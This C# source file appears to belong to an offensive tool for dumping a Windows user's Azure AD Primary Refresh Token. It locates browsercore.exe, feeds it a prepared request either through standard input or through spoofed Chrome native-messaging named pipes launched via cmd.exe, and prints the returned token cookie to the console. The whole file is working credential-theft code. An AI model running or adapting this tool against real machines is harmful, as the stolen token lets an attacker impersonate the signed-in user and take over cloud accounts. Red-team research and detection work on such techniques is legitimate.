using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.IO.Pipes;
using System.Threading;
namespace DumpAADUserPRT
{

    public class BrowserCore
    {

        public static string GetBrowserCore()
        {
            string[] filelocs = {
                @"C:\Program Files\Windows Security\BrowserCore\browsercore.exe",
                @"C:\Windows\BrowserCore\browsercore.exe"
            };
            string targetFile = null;
            foreach (string file in filelocs)
            {
                if (File.Exists(file))
                {
                    targetFile = file;
                    break;
                }
            }
            if (targetFile == null)
            {
                Console.WriteLine("[X] Could not find browsercore.exe in one of the predefined locations");
                return null;
            }
            return targetFile;
        }

        public static void GetPRT()
        {

            string targetFile = GetBrowserCore();
            if (targetFile == null)
                return;

            using (Process myProcess = new Process())
            {
                myProcess.StartInfo.FileName = targetFile;
                myProcess.StartInfo.UseShellExecute = false;
                myProcess.StartInfo.RedirectStandardInput = true;
                myProcess.StartInfo.RedirectStandardOutput = true;
                string body = ROADToken.Program.PrepBody();

                myProcess.Start();
                StreamWriter myStreamWriter = myProcess.StandardInput;
                var myInt = body.Length;
                byte[] bytes = BitConverter.GetBytes(myInt);
                myStreamWriter.BaseStream.Write(bytes, 0, 4);
                myStreamWriter.Write(body);
                myStreamWriter.Close();
                Console.WriteLine("[+] Body sent to BrowserCore");

                while (!myProcess.StandardOutput.EndOfStream)
                {
                    string line = myProcess.StandardOutput.ReadLine();
                    Console.WriteLine("[+] Obtained response:\n\t" + line);
                }

                myProcess.WaitForExit();
            }
        }
    }
    public class ChromeExtension
    {

        public static void GetPRT(bool isPause, int timeout)
        {
            var chars = "0123456789abcdefghijklmnopqrstuvwxyz";
            var randomID = new StringBuilder();
            var random = new Random();

            for (int i = 0; i < 16; i++)
            {
                randomID.Append(chars[random.Next(chars.Length)]);
            }

            string targetFile = BrowserCore.GetBrowserCore();
            NamedPipeServerStream pipeReciever = null;
            String strPipeNameReciever = "chrome.nativeMessaging.out." + randomID;

            pipeReciever = new NamedPipeServerStream(
                    strPipeNameReciever,            // The unique pipe name.
                    PipeDirection.InOut,            // The pipe is bi-directional
                    NamedPipeServerStream.MaxAllowedServerInstances,
                    PipeTransmissionMode.Byte,   // Byte type pipe 
                    PipeOptions.Asynchronous
                    );
            Console.WriteLine("[+] Named pipe Created: " + strPipeNameReciever);
            pipeReciever.BeginWaitForConnection(new AsyncCallback(RecieveOutput), pipeReciever);

            NamedPipeServerStream pipeSender = null;
            String strPipeNameSender = "chrome.nativeMessaging.in." + randomID;

            pipeSender = new NamedPipeServerStream(
                    strPipeNameSender,            // The unique pipe name.
                    PipeDirection.InOut,            // The pipe is bi-directional
                    NamedPipeServerStream.MaxAllowedServerInstances,
                    PipeTransmissionMode.Byte,   // Byte type pipe 
                    PipeOptions.Asynchronous
                    );
            Console.WriteLine("[+] Named pipe Created: " + strPipeNameSender);
            pipeSender.BeginWaitForConnection(new AsyncCallback(SendBody), pipeSender);

            string command = "/d /c \"" + targetFile + "\" chrome-extension://ppnbnpeolgkicgegkbkbjmhlideopiji/ --parent-window=0 < \\\\.\\pipe\\chrome.nativeMessaging.in." + randomID + " > \\\\.\\pipe\\chrome.nativeMessaging.out." + randomID;
            if (isPause)
            {
                Console.WriteLine("[+] Pause for " + timeout / 1000 + " seconds...");
                Console.WriteLine("[+] Execute this to obtain PRT:\n\tcmd.exe " + command);

            }
            else
            {
                Process.Start("cmd.exe", command);
            }

            Thread.Sleep(timeout);

        }
        static void SendBody(IAsyncResult iar)
        {
            try
            {
                // Get the pipe
                NamedPipeServerStream pipeServer = (NamedPipeServerStream)iar.AsyncState;
                // End waiting for the connection
                pipeServer.EndWaitForConnection(iar);


                string stuff = ROADToken.Program.PrepBody();
                StreamWriter ss = new StreamWriter(pipeServer);

                var myInt = stuff.Length;
                byte[] bytes = BitConverter.GetBytes(myInt);
                ss.BaseStream.Write(bytes, 0, 4);
                ss.Write(stuff);
                ss.Close();
                Console.WriteLine("[+] Body sent to BrowserCore");


                pipeServer.Flush();
                pipeServer.Disconnect();
                pipeServer.Close();
                pipeServer = null;

            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Sender named pipe connection error: {0}", ex.Message);
            }
        }

        static void RecieveOutput(IAsyncResult iar)
        {
            try
            {
                // Get the pipe
                NamedPipeServerStream pipeServer = (NamedPipeServerStream)iar.AsyncState;
                // End waiting for the connection
                pipeServer.EndWaitForConnection(iar);

                StreamReader pipe = new StreamReader(pipeServer);
                Console.WriteLine("[+] Obtained response:\n\t" + pipe.ReadToEnd());

                pipeServer.Flush();
                pipeServer.Disconnect();
                pipeServer.Close();
                pipeServer = null;

            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Reciever named pipe connection error: {0}", ex.Message);
            }

        }


    }
}
